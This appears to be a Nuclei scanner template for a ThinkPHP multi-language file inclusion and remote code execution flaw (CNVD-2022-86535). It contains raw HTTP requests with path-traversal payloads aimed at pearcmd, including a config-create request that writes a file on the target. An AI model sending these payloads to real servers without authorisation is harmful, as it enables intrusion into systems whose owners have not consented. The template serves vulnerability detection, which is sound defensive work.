http:
- matchers:
  - part: set_cookie
    type: word
    words:
    - think_lang=..%2F..%2F..%2F..%2F
  - condition: and
    part: body_3
    type: word
    words:
    - CONFIGURATION
    - Successfully created
  matchers-condition: or
  raw:
  - 'GET /?lang=../../../../../usr/local/php/pearcmd HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    think-lang: ../../../../../usr/local/php/pearcmd

    '
  - 'GET /?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/safedog()+{{rand_base(10)}}.log
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CNVD-2022-86535
info:
  author: arliya,ritikchaddha
  description: 'ThinkPHP has a command execution vulnerability because the multi-language
    function is enabled and the parameter passing of parameter lang is not strictly
    filtered. Attackers can use this vulnerability to execute commands.

    '
  metadata:
    max-request: 3
    verified: true
  name: ThinkPHP Multi Languag - File Inc & Remote Code Execution (RCE)
  reference:
  - https://cn-sec.com/archives/1465289.html
  - https://blog.csdn.net/qq_60614981/article/details/128724640
  - https://www.cnvd.org.cn/flaw/show/CNVD-2022-86535
  severity: high
  tags: cnvd,cnvd2022,thinkphp,rce
